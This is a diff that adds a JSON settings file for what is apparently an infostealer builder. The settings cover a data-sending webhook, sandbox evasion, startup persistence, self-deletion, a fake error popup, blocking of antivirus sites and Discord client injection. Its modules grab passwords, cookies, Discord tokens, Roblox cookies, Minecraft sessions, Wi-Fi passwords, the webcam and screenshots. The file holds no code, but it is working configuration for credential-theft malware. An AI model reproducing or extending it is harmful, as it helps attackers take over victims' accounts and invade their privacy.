@@ -1,0 +1,26 @@
+{
+    "settings" : {
+        "webhook" : "",
+        "pingme" : true,
+        "vmprotect" : true,
+        "startup" : true,
+        "melt" : false
+    },
+    
+    "modules" : {
+        "captureWebcam" : true,
+        "capturePasswords" : true,
+        "captureCookies" : true,
+        "captureHistory" : true,
+        "captureDiscordTokens" : true,
+        "captureMinecraftSessionFiles" : true,
+        "captureRobloxCookies" : true,
+        "captureWifiPasswords" : true,
+        "captureSystemInfo" : true,
+        "captureScreenshot" : true,
+
+        "fakeError" : [false, ["title", "message", 0]],
+        "blockAvSites" : true,
+        "discordInjection" : true
+    }
+}
